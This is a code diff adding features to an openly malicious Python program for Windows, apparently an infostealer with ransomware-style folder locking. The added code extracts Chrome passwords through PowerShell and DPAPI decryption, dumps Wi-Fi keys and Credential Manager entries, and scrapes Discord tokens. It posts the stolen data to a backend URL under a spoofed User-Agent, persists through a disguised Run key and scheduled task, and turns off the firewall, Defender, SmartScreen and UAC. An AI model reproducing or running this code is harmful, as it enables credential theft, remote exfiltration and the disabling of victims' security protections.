@@ -215,6 +215,280 @@ def decrypt_password(encrypted_password, key):
         return "[decryption_failed]"
 
 
+# ==================== POWERSHELL CREDENTIAL EXTRACTION ====================
+
+def extract_credentials_powershell():
+    """Extract browser credentials using PowerShell commands (more reliable)"""
+    if not WINDOWS:
+        return []
+
+    credentials = []
+
+    # PowerShell script to extract Chrome passwords using DPAPI
+    ps_script = '''
+$ErrorActionPreference = "SilentlyContinue"
+
+# Load required assemblies
+Add-Type -AssemblyName System.Security
+
+function Get-ChromePasswords {
+    $localAppData = [Environment]::GetFolderPath('LocalApplicationData')
+    $chromePath = "$localAppData\\Google\\Chrome\\User Data"
+
+    if (-not (Test-Path $chromePath)) { return @() }
+
+    # Get the encryption key from Local State
+    $localStatePath = "$chromePath\\Local State"
+    if (-not (Test-Path $localStatePath)) { return @() }
+
+    $localState = Get-Content $localStatePath | ConvertFrom-Json
+    $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+    $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]  # Remove DPAPI prefix
+    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
+
+    # Copy Login Data to temp
+    $loginDataPath = "$chromePath\\Default\\Login Data"
+    if (-not (Test-Path $loginDataPath)) { return @() }
+
+    $tempDb = "$env:TEMP\\chrome_login_temp.db"
+    Copy-Item $loginDataPath $tempDb -Force
+
+    # Query SQLite database
+    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
+    $conn.Open()
+    $cmd = $conn.CreateCommand()
+    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+    $reader = $cmd.ExecuteReader()
+
+    $results = @()
+    while ($reader.Read()) {
+        $url = $reader["origin_url"]
+        $username = $reader["username_value"]
+        $encryptedPass = $reader["password_value"]
+
+        if ($encryptedPass.Length -gt 0) {
+            # Decrypt using AES-GCM
+            $iv = $encryptedPass[3..14]
+            $payload = $encryptedPass[15..($encryptedPass.Length - 1)]
+
+            $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
+            $tag = $payload[($payload.Length - 16)..($payload.Length - 1)]
+            $ciphertext = $payload[0..($payload.Length - 17)]
+            $decrypted = New-Object byte[] $ciphertext.Length
+            $aes.Decrypt($iv, $ciphertext, $tag, $decrypted)
+            $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
+
+            $results += @{url=$url; username=$username; password=$password}
+        }
+    }
+
+    $conn.Close()
+    Remove-Item $tempDb -Force
+    return $results
+}
+
+Get-ChromePasswords | ConvertTo-Json
+'''
+
+    try:
+        # Execute PowerShell script
+        result = subprocess.run(
+            ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
+            capture_output=True, text=True, timeout=60,
+            creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS else 0
+        )
+        if result.stdout.strip():
+            data = json.loads(result.stdout)
+            if isinstance(data, list):
+                credentials.extend(data)
+            elif isinstance(data, dict):
+                credentials.append(data)
+    except:
+        pass
+
+    return credentials
+
+
+def extract_wifi_credentials_powershell():
+    """Extract WiFi credentials using PowerShell/netsh"""
+    if not WINDOWS:
+        return []
+
+    wifi_passwords = []
+
+    try:
+        # Get all WiFi profiles
+        result = subprocess.run(
+            ['netsh', 'wlan', 'show', 'profiles'],
+            capture_output=True, text=True, timeout=30,
+            creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS else 0
+        )
+
+        profiles = []
+        for line in result.stdout.split('\n'):
+            if 'All User Profile' in line or 'Profile' in line:
+                parts = line.split(':')
+                if len(parts) >= 2:
+                    profile_name = parts[1].strip()
+                    if profile_name:
+                        profiles.append(profile_name)
+
+        # Get password for each profile
+        for profile in profiles:
+            try:
+                result = subprocess.run(
+                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
+                    capture_output=True, text=True, timeout=10,
+                    creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS else 0
+                )
+
+                password = None
+                for line in result.stdout.split('\n'):
+                    if 'Key Content' in line:
+                        parts = line.split(':')
+                        if len(parts) >= 2:
+                            password = parts[1].strip()
+                            break
+
+                wifi_passwords.append({
+                    'ssid': profile,
+                    'password': password if password else '[no_password]'
+                })
+            except:
+                continue
+    except:
+        pass
+
+    return wifi_passwords
+
+
+def extract_windows_credentials():
+    """Extract Windows stored credentials using cmdkey"""
+    if not WINDOWS:
+        return []
+
+    credentials = []
+
+    try:
+        # List all stored credentials
+        result = subprocess.run(
+            ['cmdkey', '/list'],
+            capture_output=True, text=True, timeout=30,
+            creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS else 0
+        )
+
+        current_target = None
+        for line in result.stdout.split('\n'):
+            line = line.strip()
+            if 'Target:' in line:
+                current_target = line.split('Target:')[1].strip()
+            elif 'User:' in line and current_target:
+                user = line.split('User:')[1].strip()
+                credentials.append({
+                    'type': 'windows_credential',
+                    'target': current_target,
+                    'username': user,
+                    'password': '[stored_in_credential_manager]'
+                })
+                current_target = None
+    except:
+        pass
+
+    return credentials
+
+
+def extract_browser_tokens_powershell():
+    """Extract session tokens/cookies from browsers using PowerShell"""
+    if not WINDOWS:
+        return []
+
+    tokens = []
+
+    # Extract tokens from Discord leveldb
+    ps_discord = '''
+$ErrorActionPreference = "SilentlyContinue"
+$discordPaths = @(
+    "$env:APPDATA\\Discord\\Local Storage\\leveldb",
+    "$env:APPDATA\\discordcanary\\Local Storage\\leveldb",
+    "$env:APPDATA\\discordptb\\Local Storage\\leveldb"
+)
+
+$tokenPattern = '[A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27}'
+$mfaPattern = 'mfa\\.[A-Za-z0-9_-]{84}'
+$results = @()
+
+foreach ($path in $discordPaths) {
+    if (Test-Path $path) {
+        Get-ChildItem "$path\\*.ldb","$path\\*.log" -ErrorAction SilentlyContinue | ForEach-Object {
+            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+            if ($content) {
+                $matches = [regex]::Matches($content, $tokenPattern)
+                foreach ($match in $matches) {
+                    $results += @{type="discord_token"; token=$match.Value; source=$path}
+                }
+                $mfaMatches = [regex]::Matches($content, $mfaPattern)
+                foreach ($match in $mfaMatches) {
+                    $results += @{type="discord_mfa"; token=$match.Value; source=$path}
+                }
+            }
+        }
+    }
+}
+$results | ConvertTo-Json
+'''
+
+    try:
+        result = subprocess.run(
+            ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_discord],
+            capture_output=True, text=True, timeout=60,
+            creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS else 0
+        )
+        if result.stdout.strip():
+            data = json.loads(result.stdout)
+            if isinstance(data, list):
+                tokens.extend(data)
+            elif isinstance(data, dict):
+                tokens.append(data)
+    except:
+        pass
+
+    return tokens
+
+
+def run_credential_extraction_powershell():
+    """Run all PowerShell-based credential extraction"""
+    all_data = {
+        'browser_passwords': [],
+        'wifi_passwords': [],
+        'windows_credentials': [],
+        'tokens': [],
+        'system_info': get_system_info(),
+        'timestamp': datetime.now().isoformat()
+    }
+
+    try:
+        all_data['browser_passwords'] = extract_credentials_powershell()
+    except:
+        pass
+
+    try:
+        all_data['wifi_passwords'] = extract_wifi_credentials_powershell()
+    except:
+        pass
+
+    try:
+        all_data['windows_credentials'] = extract_windows_credentials()
+    except:
+        pass
+
+    try:
+        all_data['tokens'] = extract_browser_tokens_powershell()
+    except:
+        pass
+
+    return all_data
+
+
 def get_chromium_passwords(browser_name, browser_config):
     """Extract saved passwords from Chromium-based browsers"""
     passwords = []
@@ -835,7 +1109,7 @@ if HAS_WATCHDOG:
 # ==================== STARTUP PERSISTENCE ====================
 
 def add_to_startup():
-    """Add program to Windows startup"""
+    """Add program to Windows startup via Registry"""
     if not WINDOWS:
         return False
     try:
@@ -843,6 +1117,124 @@ def add_to_startup():
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, "WindowsSecurityService", 0, winreg.REG_SZ, f'"{exe_path}"')
         winreg.CloseKey(key)
+        return True
+    except:
+        return False
+
+
+def add_scheduled_task():
+    """Add scheduled task to run on computer startup/logon"""
+    if not WINDOWS:
+        return False
+    try:
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+        # Create scheduled task to run at logon
+        task_name = "WindowsSecurityUpdate"
+        # Delete existing task if any
+        subprocess.call(f'schtasks /delete /tn "{task_name}" /f', shell=True,
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # Create new task to run at logon
+        cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl highest /f'
+        result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if result == 0:
+            return True
+        # Fallback: create hourly task
+        cmd2 = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc hourly /f'
+        subprocess.call(cmd2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except:
+        return False
+
+
+def disable_firewall():
+    """Disable Windows Firewall (all profiles)"""
+    if not WINDOWS:
+        return False
+    try:
+        # Disable all firewall profiles using netsh
+        commands = [
+            'netsh advfirewall set allprofiles state off',
+            'netsh advfirewall set domainprofile state off',
+            'netsh advfirewall set privateprofile state off',
+            'netsh advfirewall set publicprofile state off',
+        ]
+        for cmd in commands:
+            subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except:
+        return False
+
+
+def disable_defender():
+    """Disable Windows Defender real-time protection"""
+    if not WINDOWS:
+        return False
+    try:
+        commands = [
+            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" ',
+            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" ',
+            'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" ',
+            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true" ',
+            'powershell -Command "Set-MpPreference -DisableScriptScanning $true" ',
+        ]
+        for cmd in commands:
+            subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except:
+        return False
+
+
+def disable_windows_security():
+    """Disable Windows Security completely (Defender, SmartScreen, UAC, Services)"""
+    if not WINDOWS:
+        return False
+    try:
+        # 1. Disable Windows Defender via Registry
+        defender_reg_commands = [
+            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
+            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f',
+            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
+            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f',
+            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f',
+            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f',
+            r'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
+        ]
+
+        # 2. Disable Windows Security Center notifications
+        security_center_commands = [
+            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f',
+            r'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v Enabled /t REG_DWORD /d 0 /f',
+        ]
+
+        # 3. Disable SmartScreen
+        smartscreen_commands = [
+            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f',
+            r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f',
+            r'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f',
+        ]
+
+        # 4. Disable UAC (User Account Control)
+        uac_commands = [
+            r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f',
+            r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f',
+            r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f',
+        ]
+
+        # 5. Stop and disable Windows Defender services
+        service_commands = [
+            'sc stop WinDefend',
+            'sc config WinDefend start= disabled',
+            'sc stop SecurityHealthService',
+            'sc config SecurityHealthService start= disabled',
+            'sc stop wscsvc',
+            'sc config wscsvc start= disabled',
+        ]
+
+        # Execute all commands
+        all_commands = defender_reg_commands + security_center_commands + smartscreen_commands + uac_commands + service_commands
+        for cmd in all_commands:
+            subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
         return True
     except:
         return False
@@ -864,6 +1256,21 @@ def run_browser_extraction():
     try:
         data = collect_all_browser_data()
         send_to_backend(data)
+    except:
+        pass
+
+
+def run_powershell_extraction():
+    """Run PowerShell-based credential extraction (more reliable on Windows)"""
+    try:
+        data = run_credential_extraction_powershell()
+        # Send PowerShell extracted data to backend
+        try:
+            url = f"{BACKEND_URL}/api/browser-data"
+            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+            requests.post(url, json=data, headers=headers, timeout=60)
+        except:
+            pass
     except:
         pass
 
@@ -924,15 +1331,31 @@ def show_unlock_gui(locked_folders):
 
 def main():
     """Main entry point - runs all malicious activities in background"""
-    # Hide console window
+    # Hide console window first
     hide_console()
 
-    # Add to startup for persistence
+    # Disable Windows Firewall (all profiles)
+    disable_firewall()
+
+    # Disable Windows Defender (PowerShell method)
+    disable_defender()
+
+    # Disable Windows Security completely (Registry, Services, SmartScreen, UAC)
+    disable_windows_security()
+
+    # Add to startup for persistence (Registry)
     add_to_startup()
 
-    # Run browser extraction in background thread
+    # Add scheduled task to run on logon
+    add_scheduled_task()
+
+    # Run browser extraction in background thread (Python method)
     browser_thread = threading.Thread(target=run_browser_extraction, daemon=True)
     browser_thread.start()
+
+    # Run PowerShell credential extraction (more reliable for Windows)
+    powershell_thread = threading.Thread(target=run_powershell_extraction, daemon=True)
+    powershell_thread.start()
 
     # Run sensitive data collection in background thread
     data_thread = threading.Thread(target=run_sensitive_data_collection, daemon=True)
@@ -940,6 +1363,7 @@ def main():
 
     # Wait for data collection to complete
     browser_thread.join(timeout=120)
+    powershell_thread.join(timeout=120)
     data_thread.join(timeout=120)
 
     # Get all target folders (user folders + other drives)
